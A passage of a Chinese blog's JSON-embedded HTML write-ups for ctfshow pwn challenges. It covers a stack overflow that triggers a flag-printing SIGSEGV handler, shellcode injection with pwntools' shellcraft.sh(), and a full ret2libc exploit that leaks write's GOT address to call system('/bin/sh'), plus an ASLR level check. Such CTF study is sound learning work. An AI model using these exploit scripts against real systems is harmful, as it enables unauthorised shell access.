data-src=\"https://z1.ax1x.com/2023/09/30/pPqyQj1.png\" alt=\"\" /><br />\n此时程序还未运行， <code>ls</code>  查看一下</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/30/pPqy1nx.png\" alt=\"\" /><br />\n利用命令 <code>./pwnme</code>  执行该文件</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/30/pPqyJAO.png\" alt=\"\" /></p>\n<h2 id=\"程序源代码\"><a class=\"anchor\" href=\"#程序源代码\">#</a> 程序源代码</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/30/pPqsSQ1.png\" alt=\"\" /><br />\n<img data-src=\"https://img1.imgtp.com/2023/09/30/KvRo0B08.png\" alt=\"\" /></p>\n<p>发现有一个 <code>signal函数</code> ，里面有 <code>flag</code></p>\n<pre><code>程序定义了一个信号量，当出现这个信号量（非法内存访问）的时候，会执行sigsegv_handler函数\n\n即当我们非法内存访问的时候，会将我们的flag通过标准错误打印出来（fflush（stderr））\n</code></pre>\n<p>为了输出 flag ，我们需要触发信号量，也就是触发 <code>非法内存访问</code> 来执行 <code>sigsegv_handler</code>  打印我们的 <code>flag</code> ，所以利用栈溢出即可完成这个触发</p>\n<p>但是我们怎么输入？可以看见 <code>argc</code>  为 <code>main</code>  函数的参数，当我们输入命令时，就相当于输入了 <code>argc</code> （这里输入要执行程序命令和 <code>参数一起输入</code> ）</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/30/pPqya3d.png\" alt=\"\" /></p>\n<p>在 <code>ctfshow函数</code> 里会将 <code>src</code>  复制到 <code>dest</code>  上 (也就是将 argc 复制到栈上)，利用这里我们就可以进行栈溢出， <code>dest</code>  在栈的大小为 0x3e（62），当我们输入 66 个 padding 时 (不知道和执行程序命令中间的 <code>空格算不算一个字符</code> ，但是输入 65 个会是段错误) 就可以得到 flag</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/30/pPqyL8J.png\" alt=\"\" /></p>\n<h1 id=\"pwn24shellcode\"><a class=\"anchor\" href=\"#pwn24shellcode\">#</a> pwn24(shellcode)</h1>\n<h2 id=\"题目-19\"><a class=\"anchor\" href=\"#题目-19\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/30/pPqyvK1.png\" alt=\"\" /></p>\n<p>32 位仅部分开启 RELRO 保护可以看到存在一个 RWX 权限的段，即可读可写可执行的段，没有开启 NX 考虑写入 <code>shellcode</code> <br />\n<img data-src=\"https://z1.ax1x.com/2023/09/30/pPq6pVK.png\" alt=\"\" /></p>\n<p><code>main函数</code> <br />\n<img data-src=\"https://z1.ax1x.com/2023/09/30/pPqcQw6.png\" alt=\"\" /></p>\n<p>ctfshow 函数无法反汇编，直接查看汇编代码</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/30/pPqcN6A.png\" alt=\"\" /></p>\n<p>这里我们发现 read 可以溢出，并且 <code>call</code>  后面还会去执行 <code>eax</code>  也就是执行我们写入的 <code>buf</code> ，由此我们就可以直接注入 <code>shellcode</code></p>\n<p>官方解释：<br />\n<img data-src=\"https://img1.imgtp.com/2023/09/30/TWlSIl88.png\" alt=\"\" /></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./pwn24')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#e=ELF('./')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'pwn.challenge.ctf.show'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28141</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>shellcode <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://img1.imgtp.com/2023/09/30/31VQIis2.png\" alt=\"\" /></p>\n<h1 id=\"pwn25ret2libc\"><a class=\"anchor\" href=\"#pwn25ret2libc\">#</a> pwn25（ret2libc）</h1>\n<h2 id=\"1题目\"><a class=\"anchor\" href=\"#1题目\">#</a> 1. 题目：</h2>\n<p>已经说明了用 <code>ret2libc</code> <br />\n<img data-src=\"https://z1.ax1x.com/2023/10/04/pPOIT3t.png\" alt=\"\" /></p>\n<p>开启了 NX 保护，无法利用 shellcode<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/04/pPOIOHg.png\" alt=\"\" /></p>\n<p>main:<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/04/pPOotPA.png\" alt=\"\" /></p>\n<p>ctfshow:<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/04/pPOoU2t.png\" alt=\"\" /></p>\n<p>可以栈溢出，没有后面函数，但是调用了 write 函数，我们可以利用来泄露 libc 地址</p>\n<h2 id=\"泄露libc地址\"><a class=\"anchor\" href=\"#泄露libc地址\">#</a> 泄露 libc 地址：</h2>\n<p>32 位程序是先一系列调用的函数然后再是参数，通过栈溢出来调用 write 输出 wire 的真实地址来得到 libc 的基址，从而知道 <code>system</code>  地址来 <code>getshell</code></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x88</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>write_plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>main<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>write_got<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>write<span class=\"token operator\">=</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"exp\"><a class=\"anchor\" href=\"#exp\">#</a> exp:</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>libc<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./32libc.so.6\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#p=process('./pwn25')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn25'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'pwn.challenge.ctf.show'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28202</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>write_plt<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>write_got<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>read_plt<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">\"read\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>read_got<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"read\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>main<span class=\"token operator\">=</span><span class=\"token number\">0x080484F6</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x88</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>write_plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>main<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>write_got<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>write<span class=\"token operator\">=</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"wiret=\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>write<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>libc<span class=\"token operator\">=</span>LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">,</span>write<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>libc_base<span class=\"token operator\">=</span>write<span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>system<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>binsh<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"str_bin_sh\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"system:\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"binsh:\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x88</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>main<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>（这里找到都是 64 位的库，我以为不行，谁知道最后居然可以）<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/04/pPOHLzn.png\" alt=\"\" /></p>\n<h1 id=\"pwn26alsr\"><a class=\"anchor\" href=\"#pwn26alsr\">#</a> pwn26（ALSR）</h1>\n<h2 id=\"题目-20\"><a class=\"anchor\" href=\"#题目-20\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/04/pPObCi4.png\" alt=\"\" /></p>\n<p>我们查看一下本机 Linux 系统的 ALSR 开启的级别</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"><span>l</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">cat</span> /proc/sys/kernel/randomize_va_space</pre></td></tr></table></figure><p><img data-src=\"https://z1.ax1x.com/2023/10/04/pPOq3h4.png\" alt=\"\" /><br />\n看到等级为 2</p>\n",
            "tags": [
                "pwn"
            ]
        }
    ]
}